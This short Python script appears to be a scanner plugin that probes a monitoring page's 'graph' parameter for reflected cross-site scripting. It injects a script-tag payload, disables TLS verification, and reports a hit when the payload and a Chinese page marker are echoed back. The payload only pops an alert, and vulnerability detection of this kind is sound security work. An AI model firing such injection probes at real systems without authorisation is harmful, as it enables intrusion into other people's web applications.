import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(url):
	if url[-1]=='/':
		url2=url+'monitoring?part=graph&graph=usedMemory</script><script>alert(document.domain)</script>'
	else:
		url2=url+'/monitoring?part=graph&graph=usedMemory</script><script>alert(document.domain)</script>'
	r=requests.get(url2,timeout=5,verify=False)
	r.encoding='utf-8'
	if '<script>alert(document.domain)</script>' in r.text and '监控系统在 _' in r.text and r.status_code==200:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
